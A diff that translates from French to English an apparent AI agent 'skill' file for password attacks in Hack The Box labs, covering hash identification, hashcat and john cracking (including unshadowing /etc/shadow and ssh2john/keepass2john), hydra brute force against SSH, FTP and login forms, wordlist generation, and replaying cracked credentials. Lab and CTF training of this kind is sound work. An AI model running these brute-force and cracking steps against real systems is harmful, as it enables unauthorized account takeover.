@@ -1,33 +1,33 @@
 ---
 name: htb-password-attacks
 description: >
-  Attaques sur mots de passe et hashes dans un contexte HTB/lab autorisé.
-  À déclencher quand on a un service d'authentification à forcer (SSH, HTTP login,
-  FTP, RDP, SMB) ou un hash à casser. Couvre : identification de hash
-  (hash-identifier), craquage offline (john, hashcat) avec règles et wordlists,
-  brute force online ciblé (hydra), génération de wordlists (cewl), et
-  manipulation de rockyou/SecLists. Produit des mots de passe en clair.
+  Password and hash attacks in an authorized HTB/lab context. Trigger this when
+  you have an authentication service to brute-force (SSH, HTTP login, FTP, RDP,
+  SMB) or a hash to crack. Covers: hash identification (hash-identifier), offline
+  cracking (john, hashcat) with rules and wordlists, targeted online brute force
+  (hydra), wordlist generation (cewl), and manipulation of rockyou/SecLists.
+  Produces cleartext passwords.
 metadata:
   type: reference
   category: credentials
-  legal: "Cibles autorisées uniquement (HTB, labs, CTF, systèmes vous appartenant)."
+  legal: "Authorized targets only (HTB, labs, CTF, systems you own)."
 ---
 
-# HTB — Attaques sur mots de passe
+# HTB — Password attacks
 
-## Quand utiliser cette skill
-- Vous avez un **hash** (extrait de /etc/shadow, d'une base, d'un Kerberoast…).
-- Vous avez un **service d'auth** et une liste d'utilisateurs à tester.
+## When to use this skill
+- You have a **hash** (extracted from /etc/shadow, a database, a Kerberoast…).
+- You have an **auth service** and a list of users to test.
 
-## A. Craquage offline (préféré : pas de bruit réseau)
+## A. Offline cracking (preferred: no network noise)
 
-### 1) Identifier le hash
+### 1) Identify the hash
 ```bash
-hash-identifier            # interactif
-# ou repérer le mode hashcat sur hashcat.net/wiki/example_hashes
+hash-identifier            # interactive
+# or find the hashcat mode on hashcat.net/wiki/example_hashes
 ```
 
-### 2) hashcat (rapide, GPU) — modes fréquents en HTB
+### 2) hashcat (fast, GPU) — modes common in HTB
 | Type | `-m` |
 |---|---|
 | MD5 | 0 |
@@ -41,24 +41,24 @@ hash-identifier            # interactif
 
 ```bash
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
-# avec règles (fortement recommandé)
+# with rules (strongly recommended)
 hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
 
-### 3) john (pratique pour formats système)
+### 3) john (handy for system formats)
 ```bash
-# fusionner passwd + shadow
+# merge passwd + shadow
 unshadow /etc/passwd /etc/shadow > unshadowed.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 john --show unshadowed.txt
 
-# formats spéciaux via *2john
+# special formats via *2john
 ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash
 zip2john secret.zip > zip.hash && john zip.hash
 keepass2john db.kdbx > kp.hash && john kp.hash
 ```
 
-## B. Brute force online (ciblé, dernier recours)
+## B. Online brute force (targeted, last resort)
 
 ```bash
 IP=10.10.10.10
@@ -66,22 +66,22 @@ IP=10.10.10.10
 hydra -l user -P rockyou.txt ssh://"$IP" -t 4
 # FTP
 hydra -L users.txt -P rockyou.txt ftp://"$IP"
-# HTTP POST form (adapter les champs et le message d'échec)
+# HTTP POST form (adapt the fields and the failure message)
 hydra -l admin -P rockyou.txt "$IP" http-post-form \
   "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
-# SMB / WinRM : préférer netexec (voir htb-smb-enum / htb-active-directory)
+# SMB / WinRM: prefer netexec (see htb-smb-enum / htb-active-directory)
 ```
 
-## C. Générer une wordlist ciblée
+## C. Generate a targeted wordlist
 ```bash
-cewl -d 2 -m 5 http://"$IP" -w custom.txt        # mots du site
-# variations (leetspeak, années) :
+cewl -d 2 -m 5 http://"$IP" -w custom.txt        # words from the site
+# variations (leetspeak, years):
 hashcat --stdout custom.txt -r /usr/share/hashcat/rules/best64.rule > custom-mangled.txt
 ```
 
-## Réflexes
-- Toujours essayer le **password reuse** avant de brute forcer : un mot de passe
-  trouvé quelque part marche souvent ailleurs.
-- Online brute force = risque de lockout ; garder `-t` bas et cibler un seul user.
-- Après craquage, réinjecter les creds dans SMB/WinRM/SSH (`netexec ... -u -p`).
-- Noter chaque paire user:pass dans `creds.txt`.
+## Reflexes
+- Always try **password reuse** before brute-forcing: a password found
+  somewhere often works elsewhere.
+- Online brute force = risk of lockout; keep `-t` low and target a single user.
+- After cracking, replay the creds against SMB/WinRM/SSH (`netexec ... -u -p`).
+- Record every user:pass pair in `creds.txt`.
